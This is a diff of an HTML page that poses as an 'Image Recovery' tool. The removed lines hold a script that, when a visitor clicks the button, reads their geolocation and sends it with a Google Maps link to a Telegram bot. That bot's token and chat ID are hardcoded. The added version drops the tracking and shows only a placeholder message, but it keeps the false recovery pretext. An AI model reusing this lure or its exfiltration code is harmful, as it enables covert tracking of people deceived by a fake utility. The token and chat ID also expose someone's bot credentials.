@@ -2,52 +2,77 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>SClick heren</title>
-</head>
-<body>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<h2> Image recovery</h2>
-<p>Recovery Your Deleted Image.</p>
+<title>Image Recovery</title>
 
-<button onclick="getLocation()">Click Here</button>
-
-<p id="result"></p>
-
-<script>
-
-function getLocation() {
-
-  if (!navigator.geolocation) {
-    document.getElementById("result").innerHTML =
-      "Geolocation supported nahi hai.";
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(function(position) {
-
-    let lat = position.coords.latitude;
-    let lon = position.coords.longitude;
-
-    document.getElementById("result").innerHTML =
-      "Latitude: " + lat + "<br>Longitude: " + lon;
-
-    let token = "8672043310:AAG21OcxWGXBE0sMvJ-z7wkYd3w1FIMSfCI";
-    let chatId = "6088000954";
-
-    let text =
-      "📍 New Location\n" +
-      "Latitude: " + lat + "\n" +
-      "Longitude: " + lon + "\n" +
-      "https://maps.google.com/?q=" + lat + "," + lon;
-
-    fetch(
-      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`
-    );
-
-  });
-
+<style>
+body{
+    margin:0;
+    font-family:Arial,sans-serif;
+    background:linear-gradient(135deg,#00c853,#ffffff);
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 }
 
+.card{
+    background:white;
+    width:350px;
+    padding:25px;
+    border-radius:20px;
+    text-align:center;
+    box-shadow:0 10px 25px rgba(0,0,0,.2);
+}
+
+h1{
+    color:#00c853;
+}
+
+p{
+    color:#555;
+}
+
+button{
+    background:#00c853;
+    color:white;
+    border:none;
+    padding:12px 25px;
+    border-radius:30px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#009624;
+}
+
+#result{
+    margin-top:20px;
+    color:#222;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <h1>Image Recovery</h1>
+    <p>Recover your deleted images quickly.</p>
+
+    <button onclick="getLocation()">
+        Recover Now
+    </button>
+
+    <p id="result"></p>
+</div>
+
+<script>
+function getLocation(){
+    document.getElementById("result").innerHTML =
+    "Recovery started...";
+}
 </script>
 
 </body>
